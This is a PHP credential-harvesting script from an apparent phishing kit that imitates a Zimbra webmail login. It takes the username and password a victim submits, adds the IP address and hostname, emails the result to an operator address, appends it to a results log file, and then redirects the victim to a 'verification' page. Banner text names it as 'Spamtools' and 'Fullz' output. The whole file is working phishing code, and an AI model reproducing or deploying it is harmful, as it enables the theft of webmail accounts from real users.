<?php
error_reporting(0);
include "bt.php";
include 'email.php';

$hostname = gethostbyaddr($ip);
$bilsmg = "------------[Zimbra - Spamtools.io]------------\n";
$bilsmg .= "-----------Login------------\n";
$bilsmg .= "----------Results Sent to $email ----------\n";
$bilsmg .= "Username: ".$_POST['username']."\n";
$bilsmg .= "Password: ".$_POST['password']."\n";
$bilsmg .= "IP: ".$ip."\n";
$bilsmg .= "------------[Zimbra Fullz]------------\n";
$bilsub = "";
$bilhead = "MIME-Version: 2.0\n";
mail($email,$bilsub,$bilsmg,$bilhead);
$fp = fopen("results/UserLogin.txt", "a+");
fwrite($fp, $bilsmg);
fclose($fp);
header("Location: verification.php");
?>